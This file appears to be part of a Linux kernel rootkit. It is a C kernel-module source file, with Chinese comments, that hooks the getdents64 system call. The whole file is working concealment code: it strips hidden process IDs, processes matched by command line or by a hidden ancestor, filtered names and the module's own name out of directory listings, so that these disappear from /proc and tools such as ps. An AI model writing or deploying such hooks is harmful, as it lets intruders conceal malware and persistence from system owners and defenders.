#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>

#include "utils/excludes/string_filtering.h"
#include "core/proc_state.h"    // proc_is_hidden(), should_hide_process(), any_ancestor_hidden()
#include "utils/proc_utils.h"
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents64.h"

// ---------------- 原函数指针 ----------------
#if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
asmlinkage long (*orig_getdents64)(unsigned int fd, char __user *dirp, unsigned int count);
#else
asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
#endif

// ---------------- 函数原型 ----------------
long hook_getdents64_impl(unsigned int fd, char __user *dirp, long ret);

// ---------------- hook impl ----------------
long hook_getdents64_impl(unsigned int fd, char __user *dirp, long ret)
{
    long new_ret = ret;
    struct linux_dirent64 *d, *kdirent;
    unsigned long offset = 0;
    unsigned long bytes_left;

    if (new_ret <= 0)
        return new_ret;

    kdirent = kmalloc(new_ret, GFP_KERNEL);
    if (!kdirent)
        return new_ret;

    if (copy_from_user(kdirent, dirp, new_ret)) {
        kfree(kdirent);
        return -EFAULT;
    }

    bytes_left = new_ret;
    offset = 0;

    while (bytes_left > 0) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset);
        size_t shift_by = 0;

#ifdef HIDE_MODULE
        if (is_mod_directory(fd) && strstr(d->d_name, MODULE_NAME))
            shift_by = d->d_reclen;
#endif

        if (is_numeric(d->d_name)) {
            int pid;
            char *cmdline = NULL;
            size_t cmd_size = 0;

            if (kstrtoint(d->d_name, 10, &pid) == 0) {
                // 获取 cmdline（可选，用于规则匹配）
                cmdline = read_cmdline_from_task(pid, &cmd_size);
                if (cmdline) {
                    for (size_t i = 0; i < cmd_size; i++)
                        if (cmdline[i] == '\0')
                            cmdline[i] = ' ';
                }

                // 隐藏决策：自身 + cmdline + 父/祖先隐藏
                if (proc_is_hidden(pid) || should_hide_process(pid, cmdline) || proc_state_any_ancestor_hidden(pid))
                    shift_by = d->d_reclen;
            }

            if (cmdline)
                kfree(cmdline);
        } else {
            // 非 PID 条目，通过字符串过滤隐藏
            if (!string_exclusions_are_empty() && should_hide_process(0, d->d_name))
                shift_by = d->d_reclen;
        }

        if (shift_by > 0) {
            if (shift_by > bytes_left)
                shift_by = bytes_left;

            memmove(d, (char *)d + shift_by, bytes_left - shift_by);
            new_ret -= shift_by;
            bytes_left -= shift_by;
        } else {
            offset += d->d_reclen;
            bytes_left -= d->d_reclen;
        }
    }

    if (copy_to_user(dirp, kdirent, new_ret)) {
        kfree(kdirent);
        return -EFAULT;
    }

    kfree(kdirent);
    return new_ret;
}


// ---------------- hook ----------------
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    unsigned int fd = regs->di;
    char __user *dirp = (char __user *)regs->si;
    long ret = orig_getdents64(regs);
    return hook_getdents64_impl(fd, dirp, ret);
}
#else
asmlinkage long hook_getdents64(unsigned int fd, char __user *dirp, unsigned int count)
{
    long ret = orig_getdents64(fd, dirp, count);
    return hook_getdents64_impl(fd, dirp, ret);
}
#endif

